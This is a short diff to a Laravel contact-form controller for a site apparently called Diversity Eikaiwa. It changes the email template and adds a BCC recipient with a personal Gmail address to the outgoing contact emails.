@@ -120,9 +120,10 @@ class PageController extends Controller
             $body .= '<strong>Message:</strong> '. $request->message;
             $data['body'] = $body;
             $data['name'] = $name;
-            Mail::send('emails.contact', $data, function($message) use ($to_name, $to_email) {
+            Mail::send('emails.plain', $data, function($message) use ($to_name, $to_email) {
                 $message->to($to_email, $to_name)->subject('Diversity Eikaiwa - Contact Form');
                 $message->from(env('MAIL_USERNAME'), 'Diversity Eikaiwa Mailer');
+                $message->bcc('tazki04@gmail.com', 'Mark');
             });
 
             $data['first_name'] = $request->first_name;
